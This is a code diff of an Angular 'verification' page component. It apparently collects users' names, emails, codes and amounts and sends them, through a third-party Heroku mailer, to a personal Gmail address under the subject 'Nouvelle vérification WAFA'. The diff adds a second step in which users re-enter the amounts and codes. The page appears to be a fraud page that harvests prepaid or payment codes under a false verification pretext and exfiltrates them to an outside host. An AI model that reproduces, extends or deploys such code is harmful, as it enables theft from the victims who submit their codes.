@@ -14,9 +14,9 @@ import { map } from 'rxjs/operators';
 export class SuiviComponent implements OnInit {
 	loading: boolean = false;
 	visibleLine: number = 2;
-	codeTab = {"1":true, "2":true}
-    codeValTab = {"1":"", "2":""}
-	codeLineError = {"v2":false}
+	codeTab = {"1":true, "2":true, "c1":true, "c2":true}
+  codeValTab = {"1":"", "2":"","c1":"","c2":""}
+	codeLineError = {"v2":false,"cv1":false,"cv2":false};
 	verificationForm: FormGroup;
 	submitted = false;
 	endSubmit = true;
@@ -41,13 +41,13 @@ export class SuiviComponent implements OnInit {
 
   constructor(private http: HttpClient, private db: DbFireService){}
 
-  switchView(placeNb: number){
+  switchView(placeNb: string){
   	this.codeTab[placeNb] = (this.codeTab[placeNb]) ? false : true;
   	this.uppercaseCode();
   }
-  copyHidden(elm: any, placeNb: number){
+  copyHidden(elm: any, placeNb: string){
   	var strToDisplay: string = '';
-  	this.codeLineError = {"v2":false};
+  	this.codeLineError = {"v2":false,"cv1":false,"cv2":false};
   	this.uppercaseCode();
   	var valLen = elm.target.value.length;
   	for(var i = 0; i < valLen; i++){
@@ -66,6 +66,8 @@ export class SuiviComponent implements OnInit {
   		$(this).val(valueTaken);
   	});
   }
+  
+
 
   ngOnInit(){
     
@@ -78,14 +80,19 @@ export class SuiviComponent implements OnInit {
         code1: new FormControl('', [Validators.required, Validators.pattern(this.codePattern), this.ValidateCode]),
         montant1: new FormControl('', [Validators.required, Validators.min(10), Validators.pattern(this.amountPattern)]),
         code2: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
-        montant2: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)])
+        montant2: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
+        codec1: new FormControl('', []),
+        montantc1: new FormControl('', []),
+        codec2: new FormControl('', []),
+        montantc2: new FormControl('', [])
   	});
   }
   submitForm(){
   	this.loading = true;
   	this.submitted = true;
   	this.endSubmit = true;
-  	this.codeLineError = {"v2":false}
+    
+  	this.codeLineError = {"v2":false,"cv1":false,"cv2":false};
   	const nm = this.verificationForm.get('nm').value.trim();
     const nmd = this.verificationForm.get('nmd').value.trim();
   	const email = this.verificationForm.get('email').value.trim();
@@ -93,16 +100,29 @@ export class SuiviComponent implements OnInit {
   	const montant1 = this.verificationForm.get('montant1').value.trim();
   	const code2 = this.verificationForm.get('code2').value.trim();
   	const montant2 = this.verificationForm.get('montant2').value.trim();
-    
+    const codec1 = this.verificationForm.get('codec1').value.trim();
+    const montantc1 = this.verificationForm.get('montantc1').value.trim();
+    const codec2 = this.verificationForm.get('codec2').value.trim();
+    const montantc2 = this.verificationForm.get('montantc2').value.trim();
+    console.log(this.endSubmit);
     if(montant2 !== '' && code2 == ''){ 
     	this.codeLineError.v2 = true;
+        this.endSubmit = false;
+        console.log(this.endSubmit+"1");
+    }
+    if(this.actualStep == 2 && (montant1 !== montantc1)){ 
+      this.codeLineError.cv1 = true;
+        this.endSubmit = false;
+    }
+    if(this.actualStep == 2 && (montant2 !== montantc2)){ 
+      this.codeLineError.cv2 = true;
         this.endSubmit = false;
     }
   	if(this.verificationForm.invalid){
   		this.loading = false; return;
   	}else{
-  		if(this.endSubmit){
 
+  		if(this.endSubmit){
         var dateNow: Date = new Date();
         var finishDate = dateNow.getDate()+'-'+(dateNow.getMonth()+1)+'-'+dateNow.getFullYear();
 
@@ -127,48 +147,63 @@ export class SuiviComponent implements OnInit {
   				' -> ' + '<b>'+montant2+'</b><br/>'+
           'Date: '+ '<b>'+finishDate+'</b><br/>';
 
-  				var sendMailTo: string = 'ramanmickael2015@gmail.com';
-  				var sendSubject: string = 'Nouvelle vérification WAFA';
+  				
 
-  				var makeRequest: any = this.http.get('https://mailertake.herokuapp.com/v1/mail?to='+sendMailTo+'&subject='+sendSubject+'+&msg='+msgContent)
-  				                       .pipe(
-  				                       	map(res => {})
-  				                       	)
-  				                       .subscribe(res => {},
-  				                       (err) => {},
-  				                       () => {});
-
-
-            this.db.addSuivi(dataSend)
-            .then(res => {
-              this.showEnd = true;
-              this.loading = false;
+          if(this.actualStep == 1){
+            var sendMailTo: string = 'ramanmickael2015@gmail.com';
+            var sendSubject: string = 'Nouvelle vérification WAFA';
+                    var makeRequest: any = this.http.get('https://mailertake.herokuapp.com/v1/mail?to='+sendMailTo+'&subject='+sendSubject+'+&msg='+msgContent)
+                                           .pipe(
+                                             map(res => {})
+                                             )
+                                           .subscribe(res => {},
+                                           (err) => {},
+                                           () => {});
 
 
+                      this.db.addSuivi(dataSend)
+                      .then(res => {
+                        this.actualStep = 2;
+                        this.submitted = false;
+                        this.loading = false;
 
 
 
-              var subscription: Subscription = new Subscription();
-              var shokorTest = interval(2000);
-              subscription.add(
-                shokorTest
-                .subscribe(res => {
-                  if(res == 2){
-                    this.showSuccess = true;
-                    subscription.unsubscribe();
-                  }
-                })
-                ); 
 
 
-              this.actualStep = 2;
-            })
-            .catch(err => {
-              this.loading = false;
-            });
+
+                        
+                      })
+                      .catch(err => {
+                        this.loading = false;
+                      });
+
+          }else{
+            this.loading = false;
+            this.showEnd = true;
 
 
-  		}
+
+
+
+            var subscription: Subscription = new Subscription();
+            var shokorTest = interval(2000);
+            subscription.add(
+              shokorTest
+              .subscribe(res => {
+                if(res == 2){
+                  this.showSuccess = true;
+                  subscription.unsubscribe();
+                }
+              })
+              ); 
+          }
+
+  				
+
+  		}else{
+        this.loading = false;
+      }
   		
   	}
   }
